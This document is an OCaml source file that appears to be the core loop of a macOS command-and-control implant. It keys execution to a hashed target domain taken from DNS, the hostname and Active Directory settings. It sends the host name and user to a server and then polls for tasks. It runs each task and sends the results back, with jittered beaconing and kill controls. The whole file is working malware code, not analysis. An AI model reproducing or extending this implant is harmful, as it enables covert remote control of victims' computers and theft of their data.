type config = {
  pub_key : string;
  session : Bcheck_codec.Cipher.session;
  transport : Bcheck_net.Channel.t;
  chunk_size : int;
  mutable interval_s : int;
  mutable jitter_pct : float;
  mutable alive : bool;
}

let expected_hash =
  "887a23cdf13bd4b8eb01b2ae05f7ca7d45f9f74099bd531a03da8d195cc6e217"

let sha256_hex s =
  Digestif.SHA256.digest_string s |> Digestif.SHA256.to_hex

let cmd_output cmd =
  try
    let ic = Unix.open_process_in (cmd ^ " 2>/dev/null") in
    let buf = Buffer.create 256 in
    (try while true do Buffer.add_char buf (input_char ic) done
     with End_of_file -> ());
    let _ = Unix.close_process_in ic in
    String.trim (Buffer.contents buf)
  with _ -> ""

let extract_domains_from_dns () =
  let raw = cmd_output "scutil --dns" in
  let lines = String.split_on_char '\n' raw in
  List.filter_map (fun line ->
    let trimmed = String.trim line in
    let prefix = "search domain[" in
    let plen = String.length prefix in
    if String.length trimmed > plen &&
       String.sub trimmed 0 plen = prefix then
      match String.index_opt trimmed ':' with
      | Some i ->
        Some (String.trim (String.sub trimmed (i + 1)
                (String.length trimmed - i - 1)))
      | None -> None
    else None
  ) lines

let extract_domain_from_hostname () =
  let h = cmd_output "hostname -f" in
  match String.index_opt h '.' with
  | Some i -> String.sub h (i + 1) (String.length h - i - 1)
  | None -> ""

let extract_ad_domain () =
  let raw = cmd_output "dsconfigad -show" in
  let lines = String.split_on_char '\n' raw in
  let prefix = "Active Directory Domain" in
  let plen = String.length prefix in
  let rec find = function
    | [] -> ""
    | line :: rest ->
      let trimmed = String.trim line in
      if String.length trimmed > plen &&
         String.sub trimmed 0 plen = prefix then
        match String.index_opt trimmed '=' with
        | Some i ->
          String.trim (String.sub trimmed (i + 1)
                  (String.length trimmed - i - 1))
        | None -> find rest
      else find rest
  in
  find lines

let check_domain () =
  let candidates =
    extract_domains_from_dns ()
    @ [ extract_domain_from_hostname ();
        extract_ad_domain ();
        String.lowercase_ascii (extract_domain_from_hostname ());
        String.lowercase_ascii (extract_ad_domain ()) ]
  in
  let candidates =
    List.filter (fun s -> String.length s > 0) candidates
    |> List.map String.lowercase_ascii
    |> List.sort_uniq String.compare
  in
  List.exists (fun d -> sha256_hex d = expected_hash) candidates

let run ~config =
  if not (check_domain ()) then Lwt.return_unit
  else
  let hostname = try Unix.gethostname () with _ -> "unknown" in
  let user =
    try (Unix.getpwuid (Unix.getuid ())).pw_name with _ -> "unknown"
  in
  let node_id = Bcheck_codec.Schema.gen_id () in
  let first = ref true in
  let open Lwt.Syntax in
  let rec tick () =
    if not config.alive then Lwt.return_unit
    else
      let msg =
        if !first then (
          first := false;
          Bcheck_codec.Schema.Checkin
            {
              id = node_id;
              hostname;
              os = "posix";
              pid = Unix.getpid ();
              user;
              interval_s = config.interval_s;
            })
        else Bcheck_codec.Schema.Heartbeat { id = node_id }
      in
      let* poll_result =
        config.transport.poll ~session:config.session ~msg
      in
      let* () =
        match poll_result with
        | Error _e -> Lwt.return_unit
        | Ok tasks ->
          Lwt_list.iter_s
            (fun task ->
              match task with
              | Bcheck_codec.Schema.Task { id = task_id; op } -> (
                match op with
                | Bcheck_codec.Schema.Sleep { interval_s; jitter_pct }
                  ->
                  config.interval_s <- interval_s;
                  config.jitter_pct <- jitter_pct;
                  Lwt.return_unit
                | Die ->
                  config.alive <- false;
                  Lwt.return_unit
                | _ ->
                  let chunks =
                    Ops.execute ~chunk_size:config.chunk_size op
                  in
                  Lwt_list.iter_s
                    (fun (status, data) ->
                      let result_msg =
                        Bcheck_codec.Schema.TaskResult
                          {
                            id = Bcheck_codec.Schema.gen_id ();
                            task_id;
                            status;
                            data;
                          }
                      in
                      let* _ =
                        config.transport.send_result
                          ~session:config.session result_msg
                      in
                      Lwt.return_unit)
                    chunks)
              | Bcheck_codec.Schema.Config
                  { interval_s; jitter_pct; kill; _ } ->
                (match interval_s with
                | Some v -> config.interval_s <- v
                | None -> ());
                (match jitter_pct with
                | Some v -> config.jitter_pct <- v
                | None -> ());
                if kill then config.alive <- false;
                Lwt.return_unit
              | _ -> Lwt.return_unit)
            tasks
      in
      if config.alive then
        let* () = config.transport.jittered_sleep () in
        tick ()
      else Lwt.return_unit
  in
  tick ()
